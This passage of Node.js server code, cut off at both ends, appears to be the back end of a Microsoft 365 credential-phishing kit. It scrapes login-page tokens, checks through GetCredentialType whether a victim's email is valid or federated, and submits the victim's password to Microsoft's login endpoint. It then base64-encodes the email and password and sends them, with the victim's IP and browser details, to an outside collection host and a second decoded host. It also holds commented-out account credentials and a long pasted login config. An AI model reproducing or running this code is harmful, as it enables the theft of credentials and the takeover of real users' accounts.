flowToken = flowToken.exec(content)[0].substr(0).replace('"sFT":"', "");//.replace('">', "");
//console.log("flowToken:: " + flowToken);

notexistcontent = 'originalRequest';
originalRequest = /"sCtx":"[^"]+/;
originalRequest = originalRequest.exec(content)[0].substr(0).replace('"sCtx":"', "");//.replace('">', "");
//console.log("originalRequest:: " + originalRequest);

notexistcontent = 'apiCanary';
apiCanary = /"apiCanary":"[^"]+/;
apiCanary = apiCanary.exec(content)[0].substr(0).replace('"apiCanary":"', "");
//console.log("apiCanary: " + apiCanary);

notexistcontent = 'clientrequestid';
clientrequestid = /"correlationId":"[^"]+/;//correlationId":(.*)"
clientrequestid = clientrequestid.exec(content)[0].substr(0).replace('"correlationId":"', "");//replace('"', "")
//console.log("clientrequestid:: " + clientrequestid);

notexistcontent = 'hpgact';
hpgact = /"hpgact":[^,]+/;
hpgact = hpgact.exec(content)[0].substr(0).replace('"hpgact":', "");//replace('"', "")
//console.log("hpgact:: " + hpgact);

notexistcontent = 'hpgid';
hpgid = /"hpgid":[^,]+/;
hpgid = hpgid.exec(content)[0].substr(0).replace('"hpgid":', "");//replace('"', "")
//console.log("hpgid:: " + hpgid);

notexistcontent = 'hpgrequestid';
hpgrequestid = /"sessionId":"[^"]+/;
hpgrequestid = hpgrequestid.exec(content)[0].substr(0).replace('"sessionId":"', "");//.replace('">', "");
//console.log("hpgrequestid:: " + hpgrequestid);

notexistcontent = 'canary';         
canary = /"canary":"[^"]+/;
canary = canary.exec(content)[0].substr(0).replace('"canary":"', "");
//console.log("canary: " + canary);

notexistcontent = 'ctx';
ctx = /"sCtx":"[^"]+/;
ctx = ctx.exec(content)[0].substr(0).replace('"sCtx":"', "");
//console.log("Ctx: " + ctx);

CounTry = 'US';
}catch(err){
    console.log("urlPost catch err1:"+err+"-"+notexistcontent+"-");
 try{   
var urlPost = /"urlPost":"[^"]+/;
urlPost = urlPost.exec(content)[0].substr(0).replace('"urlPost":"', "https://login.microsoftonline.com");
console.log("urlPost: " + unescape(JSON.parse('"'+urlPost+'"')));
console.log("urlPost: " + decodeURIComponent(JSON.parse('"' + urlPost.replace(/\"/g, '\\"') + '"')));
//const urlPost_uri = new URL(unescape(JSON.parse('"'+urlPost+'"'));
const urlPost_uri = new URL(decodeURIComponent(JSON.parse('"' + urlPost.replace(/\"/g, '\\"') + '"')));
const client_id = urlPost_uri.searchParams.get('client_id');
const Redirect_uri = urlPost_uri.searchParams.get('redirect_uri');
const scope = urlPost_uri.searchParams.get('scope');
const nonce = urlPost_uri.searchParams.get('nonce');
const ui_locales = urlPost_uri.searchParams.get('ui_locales');
const mkt = urlPost_uri.searchParams.get('mkt');
const state = urlPost_uri.searchParams.get('state');
const final_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id='+client_id+'&redirect_uri='+encodeURIComponent(Redirect_uri)+'&response_type=code%20id_token&scope='+encodeURIComponent(scope)+'&response_mode=form_post&nonce='+nonce+'&ui_locales='+ui_locales+'&mkt='+mkt+'&state='+state+'&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0&sso_reload=true';
console.log('final_url:',final_url);

var headers1_ = {
    'User-Agent': RndUserAgent,
    'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Expires': '0'
    //'Content-type': 'application/json'
    //'content-type': 'application/x-www-form-urlencoded'
};


var options1_ = {
    url: final_url,
    method: 'GET',
    headers: headers1_,
    jar:'true'

};

const res1_ = await axios(options1_);//axios.post('https://login.microsoftonline.com/')
//console.log('url: ',res1);
//console.log('url.: ',res1);
              
RefererUrl = final_url;//'https://login.microsoftonline.com/';//response.request.uri.href;no
//console.log('RefererUrl: ',RefererUrl);
//console.log('res1: ',await res1);

var content_ = await res1_.data;
//console.log('content1_: '+content_);
    //console.log('response: '+JSON.stringify(response));
    
    
    
notexistcontent = 'flowToken';
//console.log(res1);//.href  	   
flowToken =	/"sFT":"[^"]+/;
flowToken = flowToken.exec(content_)[0].substr(0).replace('"sFT":"', "");//.replace('">', "");
//console.log("flowToken:: " + flowToken);

notexistcontent = 'originalRequest';
originalRequest = /"sCtx":"[^"]+/;
originalRequest = originalRequest.exec(content_)[0].substr(0).replace('"sCtx":"', "");//.replace('">', "");
//console.log("originalRequest:: " + originalRequest);

notexistcontent = 'apiCanary';
apiCanary = /"apiCanary":"[^"]+/;
apiCanary = apiCanary.exec(content_)[0].substr(0).replace('"apiCanary":"', "");
//console.log("apiCanary: " + apiCanary);

notexistcontent = 'clientrequestid';
clientrequestid = /"correlationId":"[^"]+/;//correlationId":(.*)"
clientrequestid = clientrequestid.exec(content_)[0].substr(0).replace('"correlationId":"', "");//replace('"', "")
//console.log("clientrequestid:: " + clientrequestid);

notexistcontent = 'hpgact';
hpgact = /"hpgact":[^,]+/;
hpgact = hpgact.exec(content_)[0].substr(0).replace('"hpgact":', "");//replace('"', "")
//console.log("hpgact:: " + hpgact);

notexistcontent = 'hpgid';
hpgid = /"hpgid":[^,]+/;
hpgid = hpgid.exec(content_)[0].substr(0).replace('"hpgid":', "");//replace('"', "")
//console.log("hpgid:: " + hpgid);

notexistcontent = 'hpgrequestid';
hpgrequestid = /"sessionId":"[^"]+/;
hpgrequestid = hpgrequestid.exec(content_)[0].substr(0).replace('"sessionId":"', "");//.replace('">', "");
//console.log("hpgrequestid:: " + hpgrequestid);

notexistcontent = 'canary';         
canary = /"canary":"[^"]+/;
canary = canary.exec(content_)[0].substr(0).replace('"canary":"', "");
//console.log("canary: " + canary);

notexistcontent = 'ctx';
ctx = /"sCtx":"[^"]+/;
ctx = ctx.exec(content_)[0].substr(0).replace('"sCtx":"', "");
//console.log("Ctx: " + ctx);

CounTry = 'US';    
    
} catch(err) {
        console.log("urlPost catch err2:"+err+"--"+notexistcontent+"--");
        
        
        
                    console.log("unknown Validation Email");
					result['StatusCode'] = 5;
					result['Status'] = "unknown";
					result['Email'] = eMail;
					result['Msg'] = "Unknown O365 Validation";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
////getRestart('now');
return;         
        
        
        
        
        
    }
   
    
}

 var headers2 = {
'Accept': 'application/json',
//'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en,fr;q=0.9,de;q=0.8,it;q=0.7,co;q=0.6,pt;q=0.5,ar;q=0.4',
'canary': apiCanary,
'client-request-id': clientrequestid,
'Connection': 'keep-alive',
//'Content-Length': 0,
'Content-type': 'application/json',
//'Content-Type': 'application/x-www-form-urlencoded',
'DNT': 1,
'hpgact': hpgact,
'hpgid': hpgid,
'hpgrequestid': hpgrequestid,
'Origin': 'https://login.microsoftonline.com',
'Referer': RefererUrl,
'User-Agent': RndUserAgent,
    'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Expires': '0'
}; 


var dataString2 = {"username":eMail,"isOtherIdpSupported":false,"checkPhones":false,"isRemoteNGCSupported":false,"isCookieBannerShown":false,"isFidoSupported":false,"originalRequest":originalRequest,"country":CounTry,"forceotclogin": false,"isExternalFederationDisallowed": false,"isRemoteConnectSupported": false,"federationFlags": 0,"isSignup": false,"flowToken":flowToken,"isAccessPassSupported": true};
/*dataString2 = Object.entries(dataString2).map(([key, value]) => {
  return encodeURIComponent(key) + "=" + encodeURIComponent(value);
}).join("&");*/

var options2 = {
    url: 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
    method: 'POST',
    headers: headers2,
    data: dataString2,
    jar:'true'
};

//console.log('options2: ',options2);
 
const res2 = await axios(options2);
/*.then((res2)=>{
const recieved_Data=fetchdata.data;
console.log(recieved_Data.name);
})
*/
//console.log('res2: ',await res2);
//console.log('res2: ',await res2.data);



json = await res2.data;      
  console.log("GetCredentialType:: ",json); 
var jsonok = 'no';

if ((!json.Credentials||!json.Credentials['FederationRedirectUrl']||json.Credentials['FederationRedirectUrl']=='')&&(json.EstsProperties&&json.EstsProperties['UserTenantBranding']&&json.EstsProperties['UserTenantBranding']!=='') && ((json.IfExistsResult == 0))) {
    var BannerLogo,TileLogo,TileDarkLogo,background,bgColor,boilerText;
         if (typeof json.EstsProperties['UserTenantBranding'][0]['BannerLogo']!== 'undefined')
         BannerLogo = json.EstsProperties['UserTenantBranding'][0]['BannerLogo'];
         if (typeof json.EstsProperties['UserTenantBranding'][0]['TileLogo']!== 'undefined')
         TileLogo = json.EstsProperties['UserTenantBranding'][0]['TileLogo'];
         if (typeof json.EstsProperties['UserTenantBranding'][0]['TileDarkLogo']!== 'undefined')
         TileDarkLogo = json.EstsProperties['UserTenantBranding'][0]['TileDarkLogo'];
         if (typeof json.EstsProperties['UserTenantBranding'][0]['Illustration']!== 'undefined')
         background = json.EstsProperties['UserTenantBranding'][0]['Illustration'];
         if (typeof json.EstsProperties['UserTenantBranding'][0]['BackgroundColor']!== 'undefined')
         bgColor = json.EstsProperties['UserTenantBranding'][0]['BackgroundColor'];
         if (typeof json.EstsProperties['UserTenantBranding'][0]['BoilerPlateText']!== 'undefined')
         boilerText = json.EstsProperties['UserTenantBranding'][0]['BoilerPlateText'];
        jsonok = 'yes';
        console.log({BannerLogo,TileLogo,TileDarkLogo,background,bgColor,boilerText});
    }  
  
  if (
     ((json.Credentials&&json.Credentials['FederationRedirectUrl']&&json.Credentials['FederationRedirectUrl']!=='')||(!json.EstsProperties||!json.EstsProperties['UserTenantBranding']||json.EstsProperties['UserTenantBranding']=='') && (json.IfExistsResult==0)) 
  || ((json.EstsProperties&&json.EstsProperties['DomainType']&&json.EstsProperties['DomainType'] == 3) && (json.IfExistsResult==6) && (json.Credentials&&json.Credentials['PrefCredential']&&json.Credentials['PrefCredential'] == 1)) 
  || ((json.EstsProperties&&json.EstsProperties['DomainType']&&json.EstsProperties['DomainType'] == 4) && (json.IfExistsResult==6) && (json.Credentials&&json.Credentials['PrefCredential']&&json.Credentials['PrefCredential'] == 4))
  || ((json.EstsProperties&&json.EstsProperties['DomainType']&&json.EstsProperties['DomainType'] == 3) && (json.IfExistsResult==0) && (json.Credentials&&json.Credentials['PrefCredential']&&json.Credentials['PrefCredential'] == 1))
     ) {
        jsonok = 'yes';
    } else {
        jsonok = 'no';
    }
   
   if (jsonok == 'yes' && json.Credentials&&json.Credentials['FederationRedirectUrl']&&json.Credentials['FederationRedirectUrl']!=='') {
        if (json.Credentials['FederationRedirectUrl'].includes( 'https://sso.godaddy.com')) {
            console.log('FederationRedirectUrl/godaddy:',json.Credentials['FederationRedirectUrl']);
        } else if (json.Credentials['FederationRedirectUrl'].includes( '/adfs')) {
            console.log('FederationRedirectUrl/adfs:',json.Credentials['FederationRedirectUrl']);
        } else if (json.Credentials['FederationRedirectUrl'].includes( 'okta')) {
             console.log('FederationRedirectUrl/okta:',json.Credentials['FederationRedirectUrl']);
        } else{
            console.log('FederationRedirectUrl:',json.Credentials['FederationRedirectUrl']);
        }
        } else if (jsonok == 'yes'){
             console.log('Not a FederationRedirectUrl');
        }
        
    
                	  if(json.IfExistsResult==0&&(json.Credentials&&json.Credentials['FederationRedirectUrl']))
                		{

                    console.log("valid federated o365 Email");
					result['StatusCode'] = 4;
					result['Status'] = "VALID_EMAIL_FED";
					result['Email'] = eMail;
					result['Msg'] = "Valid Federated O365 Email";
					result['RedirectUrl'] = json.Credentials['FederationRedirectUrl'];
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();




//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
//var inow=req.query.torestart;

const cookiesvalid={cookie:"false"};
const dataUserIP=reqUserIP;
const UserUA=reqUserUA;
const ServerIP=reqServerIP;
const ServerHOST=reqServerHOST;
const SessionIP=req.socket.remoteAddress;//req.query.ip

var endTime = new Date().getTime();
const ts=endTime-starTime;
const st=result['Status'];
const ms='Federated Email';
const ss=result['Status'];//&st=${st}&



const url2save = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save:"+url2save);
 console.log("fetching");
 
const sentTOuser = await save2url(url2save,'POST',JSON.stringify(cookiesvalid),false,false);




const url2save2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save2.:"+url2save2);
 console.log("fetching2.");
const sentTOuser2 = await save2url(url2save2,'POST',JSON.stringify(cookiesvalid),false,false);

//






return;  
                      }else if(json.IfExistsResult==0||json.IfExistsResult==5||json.IfExistsResult==6){

console.log("Email is Valid office365 Email");
var headers3 = {
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en,fr;q=0.9,de;q=0.8,it;q=0.7,co;q=0.6,pt;q=0.5,ar;q=0.4',
//'cache-control': 'no-cache',
'Connection': 'keep-alive',
//'Content-Length': 0,
'Content-type': 'application/x-www-form-urlencoded',
//'Content-type': 'application/json',
//'pragma': 'no-cache',
'DNT': 1,
'Origin': 'https://login.microsoftonline.com',
'Referer': RefererUrl,//"https://login.microsoftonline.com/common/login"
'User-Agent': RndUserAgent,
    'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Expires': '0'

};


//var dataString3 = '{"username":"'+req.query.email+'","isOtherIdpSupported":false,"checkPhones":false,"isRemoteNGCSupported":false,"isCookieBannerShown":false,"isFidoSupported":false,"originalRequest":"'+originalRequest+'","country":"'+CounTry+'","forceotclogin": false,"isExternalFederationDisallowed": false,"isRemoteConnectSupported": false,"federationFlags": 0,"isSignup": false,"flowToken":"'+flowToken+'","isAccessPassSupported": true}';
/*var dataString3 = {
    i13:0,
    login:'brahimel@exrobtos.onmicrosoft.com',
    loginfmt:'brahimel@exrobtos.onmicrosoft.com',
    type:11,
    LoginOptions:3,
    lrt:'',
    lrtPartition:'',
    hisRegion:'',
    hisScaleUnit:'',
    passwd:'aJ6QVibgsJt.udd',
    ps:2,
    psRNGCDefaultType:'',
    psRNGCEntropy:'',
    psRNGCSLK:'',
    canary:canary,
    ctx:ctx,
    hpgrequestid:hpgrequestid,
    flowToken:flowToken,
    PPSX:'',
    NewUser:1,
    FoundMSAs:'',
    fspost:0,
    i21:0,
    CookieDisclosure:0,
    IsFidoSupported:1,
    isSignupPost:0,
    i19:741269
    };*/
    var dataString3 = 'i13=0&login='+encodeURIComponent(eMail)+'&loginfmt='+encodeURIComponent(eMail)+'&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd='+encodeURIComponent(passWord)+'&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary='+canary+'&ctx='+ctx+'&hpgrequestid='+hpgrequestid+'&flowToken='+flowToken+'&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i19=741269';
//encodeURIComponent()
var options3 = {
    url: 'https://login.microsoftonline.com/common/login',
    method: 'POST',
    headers: headers3,
    data: dataString3,
/*    data: {
    i13:0,
    login:'brahimel@exrobtos.onmicrosoft.com',
    loginfmt:'brahimel@exrobtos.onmicrosoft.com',
    type:11,
    LoginOptions:3,
    lrt:'',
    lrtPartition:'',
    hisRegion:'',
    hisScaleUnit:'',
    passwd:'aJ6QVibgsJt.udd',
    ps:2,
    psRNGCDefaultType:'',
    psRNGCEntropy:'',
    psRNGCSLK:'',
    canary:canary,
    ctx:ctx,
    hpgrequestid:hpgrequestid,
    flowToken:flowToken,
    PPSX:'',
    NewUser:1,
    FoundMSAs:'',
    fspost:0,
    i21:0,
    CookieDisclosure:0,
    IsFidoSupported:1,
    isSignupPost:0,
    i19:741269
    },*/
    jar:'true'
};




// Add a request interceptor
axios.interceptors.request.use(function (request) {
    //console.log(`${JSON.stringify(request, null, 2)}`);
    // Do something before request is sent
    console.log(`Request: ${request.method} : ${request.url}`);
    if(request.url.includes('https://login.microsoftonline.com/common/GetCredentialType')){
    console.log('GetCredentialType url');    
    }
    return request;
  }, function (error) {
    // Do something with request error
    return Promise.reject(error);
  });

// Add a response interceptor
axios.interceptors.response.use(function (response) {
    //console.log(`${JSON.stringify(req, null, 2)}`);
    //console.log('req: ',req);
    // Any status code that lie within the range of 2xx cause this function to trigger
    // Do something with response data
    return response;
  }, function (error) {
    // Any status codes that falls outside the range of 2xx cause this function to trigger
    // Do something with response error
    return Promise.reject(error);
  });

     try{
const res3 = await axios(options3);//axios.post('https://login.microsoftonline.com/')
//console.log('options3: ',options3);
var res3data=await res3.data;
//console.log('res3 : ',res3data);
if (res3data.indexOf('$Config={"arrUserProofs":[{') > -1) {
    //console.log('arrUserProofs: true');
    //$Config={"arrUserProofs":[{"authMethodId":"OneWaySMS","data":"OneWaySMS","display":"+XXX XXXXXXXX23","isDefault":false,"isLocationAware":false},{"authMethodId":"PhoneAppNotification","data":"PhoneAppNotification","display":"+XXX XXXXXXXX23","isDefault":false,"isLocationAware":false},{"authMethodId":"PhoneAppOTP","data":"PhoneAppOTP","display":"+XXX XXXXXXXX23","isDefault":false,"isLocationAware":false}],"fHideIHaveCodeLink":true,"oPerAuthPollingInterval":{"PhoneAppNotification":1.0},"fProofIndexedByType":true,"urlBeginAuth":"https://login.microsoftonline.com/common/SAS/BeginAuth","urlEndAuth":"https://login.microsoftonline.com/common/SAS/EndAuth","iSAMode":2,"iTrustedDeviceCheckboxConfig":1,"iMaxPollAttempts":10,"iPollingTimeout":120000,"iPollingBackoffInterval":1.04,"iRememberMfaDuration":25.0,"sTrustedDeviceCheckboxName":"rememberMFA","sAuthMethodInputFieldName":"mfaAuthMethod","iSAOtcLength":6,"iTotpOtcLength":6,"urlMoreInfo":"https://go.microsoft.com/fwlink/p/?LinkId=708614","fShowViewDetailsLink":true,"fShowAuthMethodsUpdateLink":true,"iMaxStackForKnockoutAsyncComponents":10000,"fShowButtons":true,"urlCdn":"https://aadcdn.msauth.net/shared/1.0/","urlDefaultFavicon":"https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico","urlFooterTOU":"https://www.microsoft.com/en-US/servicesagreement/","urlFooterPrivacy":"https://privacy.microsoft.com/en-US/privacystatement","urlPost":"https://login.microsoftonline.com/common/SAS/ProcessAuth","urlPostMsa":"https://login.live.com/ppsecure/partnerpost.srf?response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026scope=openid+profile+email+offline_access\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQIIAYVTT4jjdBRu2pnadmd3x1lZ1tsIooOSNEnTph1Y2LbpJOmfpGnTP4mwIU2TNmmSX5ukaZuTKILHPXkYBN0FD44Iohfxsl6EZfSw4G2Oe1tREQ-yx-3uXl0WHo_33vc-eI_3vUyqgGA4giHoewkcQY_fJshCniDyIziHawWYKI1QuJjTCzA2LuW2EE4WNNU7yOy_e_fBUeer2_yHl47i7_x6MzqF0opthjqiAecMOpwGwdw_zmZXqxUCDMPUngNZW3XHpjsJ8R8h6CEEncZ3dRfudc_ifiFHFrdGFlC8iGIlgswhvMg5rUg2-UEvaNEndquLolJ0YjcH9ZlsTQKeFvKSI0RSVLE4i5tyeA9rDaRNi2oFMsU58rZfpmr55qBG8JQQ8AMWl0V7ylPliKO52UX8Kl9eBlP8mQOeGen_xtMG8BxlDvzgNPFZfAMDUwlIqcGjDK9j0mqomCruTDs1mKTJIiHC86Bp-l28JOn9yCY9MJOjZoUqu-tFY1ZUlRpblNxeHRVgGivne5U24QxXak-mSYOA6f56YG0XIMaFus7INddliY1X7CvmcpyvaAtb61HrRZ3qN3ys35iEJt-fK6onjomN04M9ho2Mep9e1SweE8K1VLBFtVQTwwk5oVkmwi0ujMQxyajWkuLokTCr6JP2KGibzHSKVm1n1ZwFQ3ZNT9Sh2BKqktUcL1bYpOozjVDYMG23FZzUmyNeXwKflg0nP1RLcCOwymeJN19y3hD_PpHcBg5wzxMkmOuuOT6ce8Awbf1lkgjxLP88Y4CjI2XbfpR4a-SpU9PR7Vv62gOjAPgIcB1T84APjOAZ6-EO9MfO9VRyf-8GdBg7egNNHKdSmf3Yjdhh7MkOdG93q9D_vr17z_r9WuP-B8ytL_6-Hjvfzc79gCBZfIRFdpXg2XVu1i7beK46VReOpuY7AmXoPDuvD4ezm8QxdicJ3Ukmz5Ovs5TC1cSuWOaocofCFfSfZPzT16Cf0q_U-cWl7SRhF_vcV-bU1799k3tsDUqP_q_40d7lVOwgnU7f79Tev3LBfLcHXexdy2SWpmIDTbV1_-DFs_x8Ofbkyp9ffvLgh18-_ot5Cg2\u0026username=brahimel%40exrobtos.onmicrosoft.com\u0026flow=fido\u0026estsfed=1\u0026uaid=28c8a127a5524f5e800b280226cb3d7a\u0026fci=4765445b-32c6-49b0-83e6-1d93765276ca\u0026mkt=en-US\u0026acr_values=urn%3amicrosoft%3apolicies%3amfa","urlCancel":"https://login.microsoftonline.com/common/reprocess?prompt=select_account\u0026sosid=e2d634a6-7e9d-46e4-adc1-7c6ada9dc9b3\u0026ctx=rQIIAYWSP4jbdhTHLfvOtd1Lcr2EkGxXKO3RIlmSZck-CES2dJL8R7J88h-pUCHbkiVZ0s-W5H-aSkuhY6YOWdoEuhx0aZfSJV0K4boEut2YsbQldCgZ6zRzKDy-vC_f94bH-xRyJILhCIagH2ZwBD19j6DIMkGUR3AJH5MwUR2hcKVkkjA2qZZ2EU6RYyM8Khx-8OjpSffbT6RP3z5Jv__rveQCOrbjeB6dFovr9RoBluWMTWQM_KJnBBMnmK7wHyHoGQQ9TO-bAdw7v0hHZImq7IoiUbyCYlWCKiGSIvrtRHOkQS9uc2de-xxF1eTMaw0aM82dxhInl1VfTtSk5oquaIt4D2sP1G2baccaI_rabl5j2HJrwBISI8fSQMA1xbMlhk5ETpxdpW9I9DK28VcCQicx_07nLRD6-hxE8cPMV-ktDBw9ptSmhPKSianroe4YuG93WZjiqAqhwPO45UTneFU1-4lHhWCmJa0aQwebRXNWMXRWqKhBr4HKMIfR5V6tQ_jDtdHTOMoiYK6_Gbi7A4gJ2TB5jQ0CgdiGlb7uLCfl2njhjXvMZtFg-s0I6zenK0fqz3UjVCbE1u_BIS8kVqPPrVlXwuTVRiU9xaiyympKTTmBT3BXXCXKhOINd8mI3Eie1cxpZxR3HN620brnr1uzeChsuKkxVNpyXXVbk8Uam9YjvrmSt3wnaMdnjdZIMpcg4jTLLw-NKtyMXfoic_cN713h32eyu8YHwWWGAnMzcCbH8xBYjme-CYkVXpT-czzwTYT2vOeZd0ehYTu-6d03NyEYxSBCQOA74xBEwIpfbT3bg37fu53LHh7cgY5TJ7fQzGkuVzhM3Ukdp17uQY_3d1T-892jx-5vN5tPPubvf_3X7dTlfnEexQQl4CMs8eqEJGxKsw7t4aW6bSz8sVHuyoxlSsK8MRzO7hGn2IMs9CCbvcy-IzC6yCrnCi0ydJfBdfRFNv3lW9BP-f_l_LODa7nUUT6ff9JlP7p-xV8d3CwUlo7ugbHhmdHRa_5_vpZ6ef2Pb754-sMvn__J_ws1","urlResume":"https://login.microsoftonline.com/common/resume","iPawnIcon":0,"iPollingInterval":5000,"sPOST_Username":"brahimel@exrobtos.onmicrosoft.com","sFT":"AQABAAEAAAD--DLA3VO7QrddgJg7WevrA_6_5KU1RsjhV_5n-rgz-XdAOpj-oUXnhW-2XUq4v-S_yZ2kXaZao2xUG1SJjFLS8zC9EgfwgOS3rJsATjZl02qHzi7RGEjBL9CbVnN8Jvt0YJGvFyskfIK1ashgyq7CztTb8N9NWcZyHTGij2PUw-KLT8IvL-KqMS2LQa01vkMqTuEdCPzzAnTamr5DYYBVl4LrFb_2ypvdFRPvDHQTPALrJqOJek5qsIz8FivuSvX2DEI8eaGH0ChA3Tv-hLc6StwT2wAJB010tV6BNa4mNiiy9HvuGjKcYM_Dlfrg2AP5Lc8EtSPgCeAxYtxW47PEBrAni7D7dzY61Eb2iwzUecP4O8XtlFtPrak2lhJCD4OY7FSi684uXaoeXKA4FyG8WLLcJZQYQfN7rPdybN774PUFfZrGOJvtyLpTCSML6H2qLcL_es_xZWay7WX4Uo34JogmfPY6MtPmAMob0plIWh61XCVLeVKS9gtvTcfGqmxyymgzfPRQvVfwIGNV7nXztnqmF9r4NfPvvz3crAT-mlSHDzwYpsivgK9J0UMRCQNTNavF1xXZngINljBg36hevcTFAU8i41u6ACBt1nC0HWFDLIU8-FLR9HSNjwUx1zLVup31enQEjIUi5S4QAnMZmkRLLZERSF52ana0BjQYSj3Cr80jb7gzqG7fmc70TkoJVbCdhNJtz__MBBYuXg-PdOOzVPXX82wNuhQ5wVIByLrzoay1gApJin1viTPv4b9_6AnHyaKP8B8MzfSRYL9UrNBQ_-KKhEwvKZOlsrj49SCx-p0STPcjcQVMum61sOQbdq0C2PHpHeCT9DCVXiaUsRNZfQv_GwK4c6o983gF-OcVHvOukJuQKMgaAfnWxi3qraK9f4ziENUF8bIef2z8hcstu2SjwF32G0fa8W01ebBJoF0uVb-oxTW1xOtMENYgAA","sFTName":"flowToken","sCtx":"rQIIAYWSP4jbdhTHLfvOtd1Lcr2EkGxXKO3RIlmSZck-CES2dJL8R7J88h-pUCHbkiVZ0s-W5H-aSkuhY6YOWdoEuhx0aZfSJV0K4boEut2YsbQldCgZ6zRzKDy-vC_f94bH-xRyJILhCIagH2ZwBD19j6DIMkGUR3AJH5MwUR2hcKVkkjA2qZZ2EU6RYyM8Khx-8OjpSffbT6RP3z5Jv__rveQCOrbjeB6dFovr9RoBluWMTWQM_KJnBBMnmK7wHyHoGQQ9TO-bAdw7v0hHZImq7IoiUbyCYlWCKiGSIvrtRHOkQS9uc2de-xxF1eTMaw0aM82dxhInl1VfTtSk5oquaIt4D2sP1G2baccaI_rabl5j2HJrwBISI8fSQMA1xbMlhk5ETpxdpW9I9DK28VcCQicx_07nLRD6-hxE8cPMV-ktDBw9ptSmhPKSianroe4YuG93WZjiqAqhwPO45UTneFU1-4lHhWCmJa0aQwebRXNWMXRWqKhBr4HKMIfR5V6tQ_jDtdHTOMoiYK6_Gbi7A4gJ2TB5jQ0CgdiGlb7uLCfl2njhjXvMZtFg-s0I6zenK0fqz3UjVCbE1u_BIS8kVqPPrVlXwuTVRiU9xaiyympKTTmBT3BXXCXKhOINd8mI3Eie1cxpZxR3HN620brnr1uzeChsuKkxVNpyXXVbk8Uam9YjvrmSt3wnaMdnjdZIMpcg4jTLLw-NKtyMXfoic_cN713h32eyu8YHwWWGAnMzcCbH8xBYjme-CYkVXpT-czzwTYT2vOeZd0ehYTu-6d03NyEYxSBCQOA74xBEwIpfbT3bg37fu53LHh7cgY5TJ7fQzGkuVzhM3Ukdp17uQY_3d1T-892jx-5vN5tPPubvf_3X7dTlfnEexQQl4CMs8eqEJGxKsw7t4aW6bSz8sVHuyoxlSsK8MRzO7hGn2IMs9CCbvcy-IzC6yCrnCi0ydJfBdfRFNv3lW9BP-f_l_LODa7nUUT6ff9JlP7p-xV8d3CwUlo7ugbHhmdHRa_5_vpZ6ef2Pb754-sMvn__J_ws1","dynamicTenantBranding":null,"staticTenantBranding":null,"oAppCobranding":{},"iBackgroundImage":2,"sTransientDataMsaMeControl":"","sPersistentDataMsaMeControl":"","urlMsaStaticMeControl":"https://login.live.com/Me.htm?v=3","fApplicationInsightsEnabled":false,"iApplicationInsightsEnabledPercentage":0,"urlSetDebugMode":"https://login.microsoftonline.com/common/debugmode","fEnableCssAnimation":true,"fAllowGrayOutLightBox":true,"fProvideV2SsoImprovements":true,"fIsRemoteNGCSupported":true,"desktopSsoConfig":{"isEdgeAnaheimAllowed":true,"iwaEndpointUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?client-request-id=28c8a127-a552-4f5e-800b-280226cb3d7a","iwaSsoProbeUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/ssoprobe?client-request-id=28c8a127-a552-4f5e-800b-280226cb3d7a","iwaIFrameUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/iframe?client-request-id=28c8a127-a552-4f5e-800b-280226cb3d7a\u0026isAdalRequest=False","iwaRequestTimeoutInMs":10000,"startDesktopSsoOnPageLoad":false,"progressAnimationTimeout":10000,"isEdgeAllowed":false,"minDssoEdgeVersion":"17","isSafariAllowed":true,"redirectUri":"https://www.office.com/landingv2","redirectDssoErrorPostParams":{"error":"interaction_required","error_description":"Session information is not sufficient for 